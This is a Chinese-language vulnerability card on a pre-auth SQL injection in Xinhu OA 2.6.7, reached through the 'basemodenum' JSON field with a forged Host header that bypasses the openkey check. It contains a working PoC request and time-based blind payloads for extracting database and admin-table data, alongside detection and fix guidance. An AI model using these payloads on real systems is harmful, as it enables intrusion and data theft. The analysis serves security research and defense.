---
id: web-generic-sqli-xinhu-openbase-querydata-basemodenum-initbase
title: 信呼OA openbase querydata：basemodenum 经 flowModel→initbase 拼进 `num` 条件，Host 头绕过校验的前台 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: xinhu-openbase-querydata-basemodenum-sqli
tags:
- sqli
- php
- xinhu
- oa
- unauth
- host-header
- time-based-blind
- code-audit
cve: []
severity: high
confidence: medium
status: verified
affected_versions: 信呼OA v2.6.7
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-19
  verified_at: '2026-11-08T09:17:46+08:00'
  notes: 已对照原文核对：img05-11 确认 querydataAction 取 basemodenum（未过滤）与 baseoptid（经 xssrestr）、getuserid 需命中 admin、flowModel::querydata→initflow→initbase 中 `num`='$num' 直接拼接；数据流与卡片一致。未验证点：原文 PoC 用 SLEEP(0.01)/SLEEP(0.02)，实测仅 2.08s/3.75s 且无基线对照，时间盲注未严格证明，卡片已标 confidence medium 并给出 SLEEP(3) 重测模板，属如实记录；受影响版本按原文标题取 信呼OA v2.6.7
url: /docs/web/generic/sqli/web-generic-sqli-xinhu-openbase-querydata-basemodenum-initbase/
draft: false
kb_aliases:
- 信呼OA 前台 SQL 注入
- xinhu querydata SQLi
- openbaseAction querydataAction
- basemodenum 注入
- flowModel initbase 注入
- Host 头绕过 openkey
---

## 一句话结论

信呼OA 2.6.7 的 `webmain/task/openapi/openbaseAction.php::querydataAction()` 把 JSON 里的 `basemodenum` 原样传给 `flowClassModel::querydata()`，最终进入 `initbase()` 的 `m('flow_set')->getone("`num`='$num'")`，值未转义直接闭合成字符串；配合父类 `openapiAction::initAction()` 用 **HTTP Host 头**判断内网来源的缺陷，未登录即可对 `basemodenum` 做 SQL 注入。

## 原理

- **路由**：`/index.php?m=openbase|openapi&d=task&a=querydata`。`m` 以 `|` 拆成“控制器文件|子目录”，加载 `webmain/task/openapi/openapiAction.php`（父类）与 `webmain/task/openapi/openbaseAction.php`（`openbaseClassAction extends openapiAction`），调用 `querydataAction()`。
- **鉴权为什么可绕**：父类 `initAction()` 的条件是
  ```php
  if($this->keycheck && HOST != '127.0.0.1' && !contain(HOST,'192.168') && $this->openkey != ''){
      if($openkey != md5($this->openkey))$this->showreturn('', 'openkey not access', 201);
  }
  ```
  `HOST` 取自请求头 `Host` 而非 `REMOTE_ADDR`，攻击者发 `Host: 127.0.0.1`（或含 `192.168` 的串）即让整个条件为假，openkey 校验被跳过；随后 `getpostdata()` 仍会读取原始 body。
- **入参**：`getpostarr()` 直接 `json_decode($this->postdata, true)`，因此 body 必须是 JSON 对象；`$modenum = $arr['basemodenum']` 没有经过 `$rock->get()` 的黑名单，只有 `baseoptid` 走了 `xssrestr()`。
- **必要前置**：紧接的 `$uid = $this->getuserid($adminid)` 必须返回非 0，否则 `returnerror('「'.$adminid.'」用户不存在')` 直接终止，走不到注入点。`getuserid()` 按 `user/mobile/email/name/id` 分支拼 `where` 查 `[Q]admin`，并要求 `count==1`；业务上最简单的做法是传 `baseoptid=1`，命中 `id`='1' 的管理员（`xssrestr()` 已过滤引号，这个查询本身不可注入）。
- **数据流**：`$modenum` → `m('flow')->querydata($modenum, $arr, $sm)` → `flowClassModel::querydata($num,...)` 首行 `$flow = $this->initflow($num)` → `initflow()` 里 `m('flow.'.$num)` 后调用 `$this->flow->initdata($num)` → `initbase($num)`：
  ```php
  $this->moders = m('flow_set')->getone(is_numeric($num) ? $num : "`num`='$num'");
  if(!$this->moders)$this->echomsg('模块「'.$num.'」不存在，请到[流程模块列表]下添加');
  ```
  非数字时 `$num` 被单引号包裹后直接拼接，`getone()` 内部拼成 `select ... from xinhu_flow_set where `num`='<payload>' limit 1`，构成注入。
- **为什么成立**：`basemodenum` 只需不是纯数字就进入字符串分支；`'` 闭合后可用 `OR SLEEP(n)#`、`AND IF(...)`、`UNION` 等。因为该查询结果只用于判断模块是否存在（失败仅打印“模块不存在”），没有数据回显，所以优先时间盲注；原文用 `sleep(0.01)` 做验证，延时极短、对比不严谨，但源码路径与响应中“模块「<payload>」不存在”的回显说明该语句确实带着 payload 执行并返回空集。
- **附带影响**：`initflow()` 还执行 `m('flow.'.$num)`，`$num` 参与模型名/文件路径拼接，实际只会命中已存在的模型文件，暂不构成本条主张的利用链，仅作为审计线索。

## 触发条件

- 目标为信呼OA 2.6.7（或存在相同 `openbaseAction::querydataAction` / `flowClassModel::initbase` 代码的版本），`webmain/task/openapi/` 路由可达。
- 能自定义 `Host` 头（直连或反代不重写 Host）；若前置代理强制把 Host 改成不含 `192.168` 的真实域名，则绕过失效，需有效 openkey。
- 存在 `status=1` 的管理员，且 `baseoptid` 能唯一定位到它（原文用 `1`）。
- 后端 MySQL，`SLEEP()`/`IF()` 可用；请求为 `application/json` 或至少 body 不被 PHP 解析进 `$_POST`。
- 仅限授权测试。

## 利用步骤

1. 审计定位：`openbaseAction.php::querydataAction()` 中 `$modenum = $arr['basemodenum']` → `m('flow')->querydata()` → `initflow()` → `initdata()` → `initbase()` 的 `getone("`num`='$num'")`。
2. 试探前置：先发 `{"baseoptid":"1","basemodenum":"1"}`，若返回的不是“用户不存在”，说明管理员定位成功；再确认返回的是“模块不存在”而不是其他错误。
3. 构造路由与头：`POST /index.php?m=openbase%7Copenapi&d=task&a=querydata`，`Host: 127.0.0.1`。
4. 验证注入：`basemodenum` 传 `a123456' OR SLEEP(3)#`，与 `a123456` 对比响应耗时（原文用 `sleep(0.01)`，建议改 3 秒以获得可判定的差异）。
5. 逐字符取值：`a' OR IF(ASCII(SUBSTR((SELECT database()),1,1))>64,SLEEP(3),0)#`，依次取库名、`flow_set`、`admin` 表数据。
6. 收尾：该点只读（`getone`），一般无写入副作用；记录请求与响应耗时作为证据。

## PoC

```http
POST /index.php?m=openbase%7Copenapi&d=task&a=querydata HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

{"baseoptid":"1","basemodenum":"a123456' OR SLEEP(0.01)#"}
```

响应体回显“模块「a123456' OR SLEEP(0.01)#」不存在，请到[流程模块列表]下添加”，说明 payload 已被拼入 `flow_set` 查询并返回空集。

建议的时间盲注模板：

```text
{"baseoptid":"1","basemodenum":"a' OR SLEEP(3)#"}
{"baseoptid":"1","basemodenum":"a' OR IF(ASCII(SUBSTR((SELECT database()),1,1))>64,SLEEP(3),0)#"}
```

## 变体与关联

- **同产品不同点**：[[web-generic-sqli-xinhu-opendkq-zktime-sn-insert]]（`opendkq` 的 `zktime`，`sn` 进 `insert`）、[[web-generic-sqli-xinhu-kqjcmd-savefingerprint-openkqj-unauth]]（`openkqj` 的 `api&/post`，`ccid` 进 `where`）、[[web-generic-sqli-xinhu-setwxqy-base64-mobile-getone]]、[[web-generic-sqli-xinhu-base64-filter-bypass-admin-actions]]、[[web-generic-sqli-xinhu-getmfilv-fname-base64-insert]]。本条差异在**端点与 sink**：`openbase` 模块的 `basemodenum` 经 `flowModel::initbase()` 进入 `flow_set` 的 `where`，且必须先通过 `getuserid()` 的管理员存在性检查。
- **参数变体**：`basemodenum` 传纯数字时走 `getone($num)`（数字上下文，不能用引号，但可试算术/子查询）；传非法数字时走字符串分支，是主注入面。
- **注入形态变体**：`OR`/`AND`、`SLEEP()`/`BENCHMARK()`、`IF()`/`CASE WHEN`；`#` 被过滤时用 `-- -`；若某分支把查询结果带进模板渲染，可尝试 `UNION SELECT` 直接回显。
- **审计扩展**：全局搜 `getone("`num`='`、`initbase(`、`initflow(`、`m('flow.'.$`，同类“模块编号直拼 where”的点可能不止一处；`baseoptid` 的 `xssrestr()` 只挡引号，若下游有数字上下文仍应复核。

## 检测与防御

- **检测**：`/index.php` 上 `m` 含 `|`、`d=task`、`a=querydata`，且 `Host` 为 `127.0.0.1`/`localhost`/私网段而真实来源为公网；JSON body 中 `basemodenum` 含 `'`、`sleep(`、`if(`、`benchmark(`、`union`；响应出现“模块「…」不存在”且引号内是 SQL 片段；响应耗时与 `sleep` 参数吻合。
- **代码修复**：`initbase()` 的查询改为参数化，或先 `(int)$num` 再走 `id` 查询（若业务上模块编号应为数字）；`querydataAction` 对 `basemodenum` 做 `[A-Za-z0-9_]{1,32}` 白名单。
- **鉴权修复**：来源判断改用 `$_SERVER['REMOTE_ADDR']`（或受信代理下的 `X-Forwarded-For` + 代理白名单），不要用 `Host` 头；openapi 路由统一强制 openkey/签名，校验失败直接终止。
- **加固**：`getuserid()` 前置检查不应成为唯一阻断点；对 `m('flow.'.$num)` 这类模型名拼接做白名单，避免后续被扩展成文件包含/类加载问题；关闭详细错误回显。
